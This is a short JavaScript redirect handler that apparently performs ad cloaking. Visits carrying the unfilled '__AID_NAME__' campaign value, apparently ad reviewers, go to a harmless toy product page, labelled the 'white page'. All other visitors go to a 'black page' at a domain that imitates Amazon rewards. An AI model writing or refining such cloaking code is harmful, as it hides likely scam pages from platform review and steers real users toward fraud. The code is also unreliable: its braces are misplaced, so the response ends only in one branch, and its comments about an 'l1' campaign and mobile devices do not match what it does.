export default function handler(req, res) {
  // URLs to redirect
  const whitePageURL = "https://triactiontoys.com/products/glissou-the-white-seal";
  const blackPageURL = "https://amznrwrds.vercel.app/";

  // Parse the UTM parameters from the request URL
  const queryParams = new URLSearchParams(req.url.split('?')[1]);
  const utmCampaign = queryParams.get('utm_campaign');


  // Redirection logic
  if (utmCampaign === '__AID_NAME__') {
    // UTM campaign 'l1' takes priority for both desktop and mobile
    res.writeHead(302, { Location: whitePageURL });
  } else{
    // Mobile devices without 'l1' campaign
    res.writeHead(302, { Location: blackPageURL });

  res.end();
}}
